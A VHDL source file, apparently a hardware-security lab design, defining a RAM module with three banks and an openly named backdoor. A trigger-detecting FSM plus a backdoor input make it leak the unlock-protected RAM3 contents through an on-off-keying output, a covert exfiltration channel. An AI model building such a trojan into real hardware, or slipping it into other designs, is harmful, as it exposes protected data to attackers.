----------------------------------------------------------------------------------
-- Company: 
-- Engineer: 
-- 
-- Create Date: 09.05.2022 11:36:01
-- Design Name: 
-- Module Name: Backdoor - Behavioral
-- Project Name: 
-- Target Devices: 
-- Tool Versions: 
-- Description: 
-- 
-- Dependencies: 
-- 
-- Revision:
-- Revision 0.01 - File Created
-- Additional Comments:
-- 
----------------------------------------------------------------------------------


library IEEE;
use IEEE.STD_LOGIC_1164.ALL;

-- Uncomment the following library declaration if using
-- arithmetic functions with Signed or Unsigned values
use IEEE.NUMERIC_STD.ALL;

-- Uncomment the following library declaration if instantiating
-- any Xilinx leaf cells in this code.
--library UNISIM;
--use UNISIM.VComponents.all;

entity RAM_with_Backdoor is
    generic(    N:natural:=8;
                MemSize:natural:=255;
                AddrSize:natural:=7);
    port(clk : in STD_LOGIC;
           we_in : in STD_LOGIC;
           re_in : in STD_LOGIC;
           unlock_w_in : in STD_LOGIC;
           unlock_rw_in : in STD_LOGIC;
           backdoor_in : STD_LOGIC;
           OOK_out : out STD_LOGIC;
           data_in : in STD_LOGIC_VECTOR(N-1 downto 0);
           data_out : out STD_LOGIC_VECTOR(N-1 downto 0);
           addr_in : in STD_LOGIC_VECTOR(AddrSize downto 0);
           select_ram_in : in STD_LOGIC_VECTOR(1 downto 0)
           );
           
end RAM_with_Backdoor;

architecture Behavioral of RAM_with_Backdoor is

component FSM
    Port ( data_in : in STD_LOGIC_VECTOR (4 downto 0);
           s_out : out STD_LOGIC;
           clk : in STD_LOGIC);
end component;

component OOK
    Port ( data_in : in STD_LOGIC_VECTOR (N-1 downto 0);
           s_out : out STD_LOGIC;
           clk : in STD_LOGIC;
           start_in : in STD_LOGIC);
end component;

signal FSM_out,start_in : STD_LOGIC :='0';
signal data_OOK : STD_LOGIC_VECTOR(N-1 downto 0);
Type memory is array(MemSize downto 0) of STD_LOGIC_VECTOR(N-1 downto 0);
signal RAM1,RAM2,RAM3: memory;

begin

backdoor: process(clk,FSM_out,start_in,backdoor_in)

begin
if(rising_edge(clk))then

    if(start_in = '0' and FSM_out = '1' and backdoor_in = '1') then
    data_OOK <= RAM3(to_integer(unsigned(addr_in)));
    start_in<='1';
    end if;
end if;

end process;
   
u1: process(clk)
begin
    case (select_ram_in) is
        -- "00" -> RAM1
        when "00" =>
            if(we_in = '1') then
                RAM1(to_integer(unsigned(addr_in))) <= data_in;
            elsif(re_in = '1') then
                data_out <= RAM1(to_integer(unsigned(addr_in)));
            end if;
        -- "01" -> RAM2    
        when "01" =>
            if(unlock_w_in = '1' and we_in = '1') then
                RAM2(to_integer(unsigned(addr_in))) <= data_in;
            elsif(re_in = '1') then
                data_out <= RAM2(to_integer(unsigned(addr_in)));
            end if;
        --"10" --> RAM3
        when "10" =>
            if(unlock_rw_in = '1' and we_in = '1') then
                RAM3(to_integer(unsigned(addr_in))) <= data_in;
            elsif(unlock_rw_in = '1' and re_in = '1') then
                data_out <= RAM3(to_integer(unsigned(addr_in)));
            end if;
        when others =>
    end case;
end process;

u2: FSM port map(
    data_in=>data_in(4 downto 0),
    s_out=>FSM_out,
    clk=>clk
    );

u3: OOK port map(
    data_in=>data_OOK,
    s_out=>OOK_out,
    start_in=>start_in,
    clk=>clk
    );

end Behavioral;
